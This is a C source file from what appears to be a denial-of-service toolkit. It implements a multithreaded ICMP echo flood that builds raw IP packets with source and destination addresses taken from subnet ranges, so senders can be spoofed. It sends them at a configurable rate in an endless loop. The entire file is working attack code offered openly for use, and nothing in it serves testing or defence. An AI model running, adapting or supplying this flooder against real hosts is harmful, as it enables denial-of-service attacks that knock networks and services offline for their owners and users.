#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/icmp_flood.h"

extern int g_num_threads;

// session counting
uint32_t g_icmp_num_total;
uint32_t g_icmp_num_generated_in_sec;

// from main()
InputArguments g_icmp_input;
uint32_t g_icmp_request_per_sec;

// for masking next ip address
MaskingArguments g_icmp_now;

// thread
pthread_mutex_t g_icmp_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_icmp_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_icmp_before_time;
struct timespec g_icmp_now_time;

void IcmpFloodPrintUsage(void)
{
    printf("ICMP Flooding Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
    return;
}

void *GenerateIcmpFlood(void *data)
{
    int sock = MakeRawSocket(IPPROTO_ICMP);
    struct iphdr ipv4_h;
    PrepareEmptyIphdr(&ipv4_h);
    ipv4_h.tot_len = sizeof(struct iphdr);
    ipv4_h.tot_len += sizeof(struct icmp);
    ipv4_h.protocol = IPPROTO_ICMP;

    // icmp settings
    char icmp_buf[sizeof(struct icmp)] = {0, };
    struct icmp *icmp_h_ptr = (struct icmp *)icmp_buf;
    icmp_h_ptr->icmp_type = ICMP_ECHO;
    icmp_h_ptr->icmp_code = 0;
    icmp_h_ptr ->icmp_cksum = 0;
    icmp_h_ptr->icmp_id = getpid();

    MaskingArguments icmp_now;

    char packet[BUFFER_SIZE];

    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_icmp_mutex);
        // get now resource
        GetMaskingArguments(&g_icmp_input, &g_icmp_now);
        icmp_now = g_icmp_now;

        // wait a second
        if (g_icmp_num_generated_in_sec >= g_icmp_request_per_sec) {
            pthread_cond_wait(&g_icmp_cond, &g_icmp_mutex);
        }
        g_icmp_num_generated_in_sec++;
        g_icmp_num_total++;
        
        // *** end of critical section ***
        pthread_mutex_unlock(&g_icmp_mutex);

        // make ipv4 header
        ipv4_h.saddr = inet_addr(icmp_now.src);
        ipv4_h.daddr = inet_addr(icmp_now.dest);
        ipv4_h.check = IphdrGetChecksum((uint16_t *) &ipv4_h,
                sizeof(struct iphdr) + sizeof(struct icmp));

        // make icmp header
        icmp_h_ptr->icmp_seq = htons(g_icmp_num_total);
        icmp_h_ptr->icmp_cksum = IphdrGetChecksum(
                (u_short *) icmp_h_ptr,
                sizeof(struct icmp));
        
        // make and send packet
        AssembleIphdrWithData(packet, &ipv4_h, icmp_h_ptr, sizeof(struct icmp));
        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, icmp_now.port);
    }
    close(sock);
    return NULL;
}

void *IcmpFloodTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_icmp_mutex);
        TimeCheck(
                &g_icmp_cond,
                &g_icmp_before_time,
                &g_icmp_now_time,
                &g_icmp_num_generated_in_sec);
        pthread_mutex_unlock(&g_icmp_mutex);
    }
    return NULL;
}

void IcmpFloodMain(char *argv[])
{
    int argc = 0;
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        IcmpFloodPrintUsage();
        return;
    }
    // get ip address, mask, port
    ArgvToInputArguments(argv, &g_icmp_input);
    g_icmp_num_generated_in_sec = 0;
    g_icmp_num_total = 0;
    memset(&g_icmp_before_time, 0, sizeof(struct timespec));
    memset(&g_icmp_now_time, 0, sizeof(struct timespec));
    g_icmp_request_per_sec = atoi(argv[3]);
    int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    int i;
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Sending ICMP Flooding requests to %s using %d threads %u per sec\n",
            g_icmp_input.dest,
            num_threads,
            g_icmp_request_per_sec);

    for (i = 0; i < num_threads; i++) {
        pthread_create(
                &threads[i],
                NULL,
                GenerateIcmpFlood,
                (void *)&thread_ids[i]);
    }
    pthread_create(&threads[i], NULL, IcmpFloodTimeCheck, NULL);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("thread %d joined\n", i);
    }
    pthread_mutex_destroy(&g_icmp_mutex);
    printf("Icmp Flooding finished\nTotal %u packets sent.\n",
            g_icmp_num_total);
    pthread_exit(NULL);
    return;
}
